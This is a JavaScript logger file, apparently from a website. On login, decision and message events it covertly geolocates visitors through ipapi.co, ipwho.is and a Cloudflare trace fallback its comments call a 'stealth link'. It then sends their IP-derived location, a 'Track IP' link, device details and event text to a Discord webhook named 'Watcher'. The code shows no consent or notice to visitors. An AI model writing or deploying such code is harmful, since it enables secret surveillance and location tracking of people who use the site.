// js/logger.js

let lastLogTime = 0;
const LOG_COOLDOWN = 15000;

async function fetchWithTimeout(resource, options = {}) {
    const { timeout = 2500 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(resource, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (err) {
        clearTimeout(id);
        throw err;
    }
}

window.sendPrivateLog = async function(message, isEmergency = false) {
    if (!window._secret) return;

    const mode = window.getLoggingMode();
    const url = window.getLogKey();
    
    // 1. Define High-Priority Events
    const needsLocation = message.includes("Login") || 
                          message.includes("Decision") || 
                          message.includes("Message");

    const isBreadcrumb = message.includes("Homepage") || 
                         message.includes("Ep0") || 
                         message.includes("Final Episode");
                           
    const isPriority = (isEmergency === true || isEmergency === 1 || needsLocation || isBreadcrumb);

    // 2. Cooldown check (only for non-priority events)
    const now = Date.now();
    if (!isPriority && (now - lastLogTime < LOG_COOLDOWN)) {
        console.warn("⏳ Logger: Cooldown active. Log skipped.");
        return;
    }

    if (mode === "off" || (mode === "emergency" && !isPriority)) return;

    try {
        const device = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
        const platform = navigator.platform;
        let locationData = "Location Skipped (Privacy/Speed)";

        // 3. Selective Geolocation
        if (needsLocation) {
            locationData = "Fetching...";
            try {
                // Try ipapi.co
                const res1 = await fetchWithTimeout("https://ipapi.co/json/");
                if (res1.ok) {
                    const geo = await res1.json();
                    locationData = `${geo.city}, ${geo.region} (${geo.country_name})`;
                } else throw new Error();
            } catch (e1) {
                // Try ipwho.is
                try {
                    const res2 = await fetchWithTimeout("https://ipwho.is/");
                    const geo2 = await res2.json();
                    if (geo2.success) locationData = `${geo2.city}, ${geo2.region} (${geo2.country})`;
                    else throw new Error();
                } catch (e2) {
                    // Final Stealth Link
                    try {
                        const res3 = await fetch("https://1.1.1.1/cdn-cgi/trace");
                        const text = await res3.text();
                        const data = Object.fromEntries(text.trim().split('\n').map(e => e.split('=')));
                        locationData = `${data.loc || '??'} | [Track IP: ${data.ip}](https://whatismyipaddress.com/ip/${data.ip})`;
                    } catch (e3) {
                        locationData = "Loc Blocked";
                    }
                }
            }
        }

        // 4. Send to Discord
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: isPriority ? "🚨 PRIORITY" : "Watcher",
                content: `**Event**: ${message}\n🌍 **Loc**: ${locationData}\n📱 **Dev**: ${device} (${platform})`
            })
        });

        lastLogTime = Date.now();
        
    } catch (e) {
        console.error("❌ Logger Failed:", e);
    }
};